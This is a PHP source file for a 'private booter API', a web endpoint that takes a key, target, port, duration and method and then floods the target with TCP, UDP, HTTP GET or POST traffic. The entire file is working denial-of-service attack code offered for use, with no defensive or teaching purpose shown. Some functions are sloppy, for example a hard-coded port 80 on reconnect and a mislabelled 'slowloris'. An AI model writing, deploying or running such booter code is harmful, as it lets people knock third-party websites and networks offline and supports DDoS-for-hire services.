<?php 

/* 
* Simple Private Booter API by hearsecurity. 
*/ 

ini_set("display_errors", "Off");
error_reporting(0);

$validKeys = array(
	"ADOKVAD1231231KDKKVSVKADVKA",
);

$validMethods = array(

	"TCP",  "UDP", "GET", "POST"
);


if (isset($_GET['key'], $_GET['target'], $_GET['port'], $_GET['time'], $_GET['method'])) {

    if (in_array($_GET['key'], $validKeys)) {
        
        if (in_array($_GET['method'], $validMethods)) {

            $key    = $_GET['key'];
			$target = $_GET['target'];
			$port   = (int)$_GET['port'];
			$time   = (int)$_GET['time'];
            $method = $_GET['method'];
            
            switch ($method) {

                case "TCP":
    
                    tcpflood($target, 500, 1024, $port, $time);
                    break;

                case 'UDP':
    
                    udpflood($target, 500, 1024, $port, $time);
                    break;

                case 'GET':
    
                    httpflood($target, "/index.php", $port, $time);
                    break;

                case 'POST':
    
                    slowloris($target, "/index.php", $port, $time);
                    break;

                default:
                    break;
            }

        }
    }

}else{

    echo "Usage: send.php?target=&port=&time=&method=&key="; 
}

 function tcpflood($host,$packets,$packetsize,$port,$delay)
 {

    $packet = "";
    for($i=0;$i<$packetsize;$i++)
       $packet .= chr(mt_rand(1,256));
    for($i=0;$i<$packets;$i++)
    {
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,30))
       {
          return 0;
       }
       else
       {
          fwrite($fp,$packet);
          fclose($fp);
       }
       sleep($delay);
    }
   
 }

function udpflood($host, $packets,$packetsize,$port,$delay)
 {
    
    $packet = "";
    for($i=0;$i<$packetsize;$i++)
       $packet .= chr(mt_rand(1,256));
    for($i=0;$i<$packets;$i++)
    {
       if(!$fp=fsockopen('udp://'.$host, $port, $errno, $errstr, 30))
       {
          return 0;
       }
       else
       {
          fwrite($fp,$packet);
          fclose($fp);
       }
       sleep($delay);
    }
 }


function httpflood( $host , $page , $port, $length ) {

        ignore_user_abort(TRUE);
        set_time_limit(0);

        if ( $page == '' )
            {
            $page = '/';
            }

        $max_time = time() + $length;

        $packet .= 'GET ' . $page . ' HTTP/1.1' . "\r\n";
        $packet .= 'Host: ' . $host . "\r\n";
        $packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
        $packet .= 'Keep-alive: 300' . "\r\n";
        $packet .= 'Connection: keep-alive' . "\r\n\r\n";

        @$fp = fsockopen( $host, $port, $errno, $errstr, 5 );
        while( 1 )
            {
            if ( time() > $max_time )
                {
                break;
                }

            if( $fp )
                {
                fwrite( $fp , $packet );
                fclose( $fp );
                $packets++;
                }
            else
                {
                @$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
                }
            }
        }

function slowloris( $host , $page , $port, $length ) {

                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                if ( $page == '' )
                        {
                        $page = '/';
                        }
 
                $max_time = time() + $length;
 
                $packet .= 'POST ' . $page . ' HTTP/1.1' . "\r\n";
                $packet .= 'Host: ' . $host . "\r\n";
                $packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
                $packet .= 'Content-length: 42' . "\r\n\r\n";
 
                @$fp = fsockopen( $host, $port, $errno, $errstr, 5 );
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( $host, $port, $errno, $errstr, 5 );
                                }
                        }
 
                
                }

?> 